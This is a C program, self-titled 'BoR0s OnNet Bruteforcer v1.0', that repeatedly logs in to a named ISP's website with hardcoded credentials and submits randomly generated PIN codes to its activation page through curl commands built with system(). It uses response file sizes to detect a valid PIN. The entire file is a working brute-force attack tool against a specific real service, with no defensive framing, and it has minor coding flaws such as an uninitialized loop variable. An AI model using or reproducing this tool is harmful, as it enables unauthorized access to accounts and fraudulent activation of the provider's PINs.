#include <stdio.h>

int main() {

char pincode[] = "0011111111111";
char buffer[512];
char param[] = "rm -rf boro.html ; rm -rf boro.cook ; curl -s https://secure.on.net.mk/users/nlogin.php -k -d \"userlogin=damagerulz\" -d \"userpassword=target\" -d \"signup=1\" -d \"image.x=19\" -d \"image.y=6\" -s -c \"boro.cook\" >/dev/null ; curl -s https://secure.on.net.mk/users/npin.php -k -d \"pin=%s\" -d \"activate=activate\" -d \"image.x=19\" -d \"image.y=6\" -b \"boro.cook\" -o \"boro.html\"";
int i;

FILE *moo = 0;

printf("BoR0s OnNet Bruteforcer v1.0\n----------------------------\n");

while (1) {

srandom(time(NULL));
if (i != 1) for (i=2; i<=12; i++) pincode[i] = (random()%7)+48;

sprintf(buffer, param, pincode);

printf("Trying pin %s ...\n", pincode);
system(buffer);

moo = fopen("boro.html", "r");

if (!moo) {
printf("Error: connection failure\n");
i=1;
continue;
}

i=0;

while(getc(moo) != EOF) i++;

fclose(moo);

if (i == 8255) {
printf("Error: pin incorrect!\n", i);
} else if (i == 8262) {
printf("Error: pin already activated.\n");
} else if (i == 0) {
printf("Error: connection failure\n");
i=1;
continue;
} else {
printf("Valid pin found (PROBABLY): %s\n", pincode);
break;
}

i=0;

printf("----------------------------\n");

}

return 0;

}
